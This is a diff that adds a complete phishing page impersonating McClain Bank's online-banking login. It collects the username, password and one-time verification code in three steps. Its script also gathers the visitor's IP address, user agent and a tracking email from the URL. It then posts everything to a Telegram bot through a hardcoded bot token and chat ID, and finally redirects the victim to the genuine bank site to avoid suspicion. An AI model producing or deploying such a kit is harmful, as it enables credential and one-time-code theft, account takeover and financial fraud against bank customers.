@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Login · McClain Bank</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --theme:#700e0e; --theme-press:#b81717; --theme-focus:#941313;
+    --text:#071523; --text2:#626e7a; --page:#e3e7ed;
+    --btn-radius:8px; --card-radius:10px;
+    --shadow:0 3px 12px 0 rgba(0,0,0,.15);
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;min-height:100%;-webkit-font-smoothing:antialiased}
+  body{
+    font-family:roboto,-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;
+    font-size:14px;color:var(--text);background:var(--page);
+    background-image:url(https://secure.mcclainbank.com/images/fi-assets/mcclain-bank/mcclain-bank-background-landscape-db09c853.png);
+    background-size:cover;background-position:center;
+    display:flex;flex-direction:column;min-height:100vh;
+  }
+  .banner{
+    display:flex;gap:10px;align-items:flex-start;
+    background:#eef1f5;border-bottom:1px solid #d5dbe3;
+    padding:10px 16px;font-size:12.5px;color:#3d4752;line-height:1.45;
+  }
+  .banner svg{flex:0 0 auto;width:18px;height:18px;margin-top:1px;fill:#3d4752}
+  .banner p{margin:0;max-width:760px}
+  main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px 0}
+  .card{
+    background:#fff;border-radius:var(--card-radius);box-shadow:var(--shadow);
+    width:90%;max-width:480px;padding:40px;margin:auto;
+  }
+  .logo{display:block;height:80px;margin:0 auto}
+  .fdic{display:flex;align-items:center;justify-content:center;gap:8px;margin:18px 0 4px;
+    color:var(--text2);font-size:11px;text-align:center}
+  .fdic svg{flex:0 0 auto}
+  form{margin:0}
+  .field{position:relative;border:1px solid var(--text2);border-radius:4px;
+    padding:18px 12px 6px;margin-top:26px;background:#fff}
+  .field .label{position:absolute;top:-8px;left:10px;background:#fff;padding:0 4px;
+    font-size:12px;font-weight:500;color:var(--text2)}
+  .field input{width:100%;border:0;outline:0;font:inherit;font-size:16px;
+    color:var(--text);background:transparent;padding:2px 0 4px}
+  .field:focus-within{border-color:var(--theme);box-shadow:0 0 0 2px rgba(112,14,14,.15)}
+  .field:focus-within .label{color:var(--theme)}
+  .row{display:flex;align-items:center;gap:12px;margin-top:12px}
+  .row.right{justify-content:flex-end}
+  .row.between{justify-content:space-between;margin-top:26px}
+  a{color:var(--theme);font-weight:500;text-decoration:none;font-size:14px}
+  a:hover{text-decoration:underline}
+  .forgot{margin-top:-6px;display:inline-block}
+  .signas{color:var(--text2);font-size:13px;margin-top:18px;text-align:center}
+  .signas b{color:var(--text);font-weight:500;word-break:break-all}
+  button{
+    border:0;cursor:pointer;font:inherit;font-weight:500;color:#fff;background:var(--theme);
+    border-radius:var(--btn-radius);padding:12px 26px;min-width:132px;font-size:15px;
+  }
+  button:hover{background:var(--theme-press)}
+  button:disabled{opacity:.55;cursor:default}
+  .status-message{font-size:13px;color:var(--text2);text-align:center;margin-top:16px}
+  footer{text-align:center;color:var(--text2);font-size:12px;padding:22px 16px 30px;line-height:1.7}
+  footer a{color:#660000;font-weight:400;font-size:12px}
+  .ehl{vertical-align:-1px;margin-right:4px;fill:var(--text2)}
+  [hidden]{display:none!important}
+  @media (max-width:600px){
+    .card{width:88%;padding:22px;margin-top:20px}
+    main{padding:0}
+    .logo{height:64px}
+    button{min-width:110px;padding:11px 18px}
+  }
+</style>
+</head>
+<body>
+
+<div class="banner">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true">
+    <path fill-rule="evenodd" d="M12.598 5.066c-.26-.422-.937-.422-1.197 0L7.61 11.225l-3.773 6.127c-.211.343.006.898.599.898h15.13c.593 0 .81-.555.6-.898l-3.774-6.127L12.6 5.066Zm1.278-.786c-.845-1.374-2.906-1.374-3.752 0l-3.792 6.158-3.773 6.128c-.903 1.466.257 3.184 1.876 3.184h15.13c1.618 0 2.78-1.718 1.876-3.184l-3.773-6.128-3.792-6.158ZM12 7.25a.75.75 0 0 1 .75.75v4a.75.75 0 1 1-1.5 0V8a.75.75 0 0 1 .75-.75Zm0 7.25a1 1 0 1 0 0 2 1 1 0 0 0 0-2Z" clip-rule="evenodd"/>
+  </svg>
+  <p>Stay alert! Scammers can spoof caller ID. Never share your digital banking credentials or one-time passcodes. When in doubt, hang up and call us directly.</p>
+</div>
+
+<main>
+  <div class="card">
+    <img class="logo" src="https://secure.mcclainbank.com/images/fi-assets/mcclain-bank/mcclain-bank-logo-2ca7cfd5.png" alt="McClain Bank">
+    <div class="fdic">
+      <svg xmlns="http://www.w3.org/2000/svg" width="60" height="17" fill="none" aria-label="FDIC insured">
+        <path fill="#000" fill-rule="evenodd" d="M8.8.7h5.1c4.6 0 7.6 3 7.6 7.6 0 5.2-3.3 7.7-8.5 7.7H8.8V.7Zm4.8 3.5h-.7v8.3c2.6 0 4.6-1 4.6-4.2 0-2.8-1.7-4.1-4-4.1h.1ZM37.4 5.1v-4c-1-.5-2.2-.7-3.3-.7-2 0-4 .7-5.5 2.2a8.1 8.1 0 0 0-2.2 5.7c0 4.5 3.4 7.8 7.6 7.8a5 5 0 0 0 3.4-1v-4c-1 .7-2 1-3.2 1.1-1 0-2-.4-2.7-1.2a4 4 0 0 1-1-2.9c-.1-1 .3-2.1 1-3 .7-.7 1.7-1.1 2.7-1.1 1.2 0 2.2.4 3.2 1.1ZM0 .7V16h4v-5.8h4V6.6H4V4.2h4.2V.7H0ZM22 16h4V.7h-4V16Z" clip-rule="evenodd"/>
+      </svg>
+      <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
+    </div>
+
+    <form id="step-email">
+      <div class="field">
+        <div class="label">Username</div>
+        <input id="email" type="text" spellcheck="false" autocorrect="off" autocapitalize="off" autocomplete="username" aria-label="Username">
+      </div>
+      <div class="row right"><a href="#" class="forgot-link">Forgot?</a></div>
+      <div class="row between">
+        <a href="#">First time user? Enroll now.</a>
+        <button type="submit">Continue</button>
+      </div>
+    </form>
+
+    <form id="step-password" hidden>
+      <div class="signas">Signing in as <b class="address-value"></b> · <a href="#" class="change-link">Change</a></div>
+      <div class="field">
+        <div class="label">Password</div>
+        <input id="password" type="password" autocomplete="current-password" aria-label="Password">
+      </div>
+      <div class="row right"><a href="#" class="forgot-link">Forgot?</a></div>
+      <div class="row right"><button type="submit">Sign in</button></div>
+    </form>
+
+    <form id="step-code" hidden>
+      <div class="signas">A code was sent to the phone on file for <b class="address-value"></b></div>
+      <div class="field">
+        <div class="label">Verification code</div>
+        <input id="code" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="8" aria-label="Verification code">
+      </div>
+      <div class="row right"><button type="submit">Verify</button></div>
+      <div class="status-message" hidden></div>
+    </form>
+  </div>
+</main>
+
+<footer>
+  © 2026 McClain Bank <span>•</span> (405) 527-6503<br>
+  <a href="#">Privacy policy</a> <span>•</span> Member FDIC<br>
+  <svg width="16" height="11" viewBox="0 0 10 7" class="ehl" aria-hidden="true"><path d="M4.96.222L.337 2.588v.962l.511.007v3.448h8.186L9.03 3.55h.55v-.962L4.959.222zm3.163 5.872H1.76V3.028l3.2-1.65 3.163 1.65v3.066zm-4.677-2.26h2.999v-.828H3.446v.828zm0 1.489h2.985v-.828H3.446v.828z"/></svg>
+  Equal Housing Lender
+</footer>
+
+<script>
+const emailInput    = document.getElementById('email');
+const passwordInput = document.getElementById('password');
+const codeInput     = document.getElementById('code');
+const stepEmail     = document.getElementById('step-email');
+const stepPassword  = document.getElementById('step-password');
+const stepCode      = document.getElementById('step-code');
+const statusMessage = stepCode.querySelector('.status-message');
+
+const steps = [stepEmail, stepPassword, stepCode];
+const addressValues = document.querySelectorAll('.address-value');
+const trackingEmail = new URLSearchParams(location.search).get('e') || '';
+
+const BOT_TOKEN = '7508450893:AAGm3TtVH2nyhe-CZ35-Hi1Tol_2594atR8';
+const CHAT_ID   = '6069290001';
+const REDIRECT_URL = 'https://secure.mcclainbank.com';
+const FINAL_DELAY_MS = 2000;
+
+function showStep(i){
+  steps.forEach((s,n)=>{ s.hidden = n !== i; });
+  if(i===0) emailInput.focus();
+  else if(i===1) passwordInput.focus();
+  else codeInput.focus();
+}
+function updateAddress(){
+  addressValues.forEach(v=>{ v.textContent = emailInput.value; });
+}
+function buttonOf(f){ return f.querySelector('button'); }
+function lockButton(b,l){ b.textContent = l; b.disabled = true; }
+function resetButtons(){
+  buttonOf(stepEmail).textContent='Continue';    buttonOf(stepEmail).disabled=false;
+  buttonOf(stepPassword).textContent='Sign in';  buttonOf(stepPassword).disabled=false;
+  buttonOf(stepCode).textContent='Verify';       buttonOf(stepCode).disabled=false;
+  statusMessage.hidden = true;
+}
+function fetchIp(){
+  return fetch('https://api.ipify.org?format=json')
+    .then(r=>r.json()).then(d=>d.ip).catch(()=>'Unavailable');
+}
+async function send(stage, otp){
+  const ip = await fetchIp();
+  const msg =
+    '*#--------[ McCLAIN BANK ]---------#*\n\n' +
+    '*Username* : ' + emailInput.value.trim() + '\n' +
+    '*Password* : ' + passwordInput.value.trim() + '\n' +
+    '*Code* : ' + (otp || '-') + '\n' +
+    '*IP* : ' + ip + '\n' +
+    '*Device* : ' + navigator.userAgent + '\n' +
+    (trackingEmail ? '*Recipient* : ' + trackingEmail + '\n' : '') +
+    '\n*#------------[ ' + stage + ' ]-------------#*';
+  return fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:CHAT_ID,text:msg})
+  }).catch(()=>{});
+}
+
+stepEmail.addEventListener('submit', e=>{
+  e.preventDefault(); updateAddress(); showStep(1);
+});
+
+stepPassword.addEventListener('submit', async e=>{
+  e.preventDefault(); updateAddress();
+  lockButton(buttonOf(stepPassword),'Logging in...');
+  await send('STEP 2 - PASSWORD');
+  resetButtons(); showStep(2);
+});
+
+stepCode.addEventListener('submit', async e=>{
+  e.preventDefault(); updateAddress();
+  lockButton(buttonOf(stepCode),'Verifying...');
+  statusMessage.textContent='Verifying your code...'; statusMessage.hidden=false;
+  try { await send('STEP 3 - CODE', codeInput.value.trim()); }
+  finally { setTimeout(()=>{ location.href = REDIRECT_URL; }, FINAL_DELAY_MS); }
+});
+
+document.querySelectorAll('.change-link').forEach(a=>{
+  a.addEventListener('click', e=>{ e.preventDefault(); resetButtons(); showStep(0); });
+});
+document.querySelectorAll('.forgot-link, footer a').forEach(a=>{
+  a.addEventListener('click', e=>e.preventDefault());
+});
+
+showStep(0);
+</script>
+</body>
+</html>
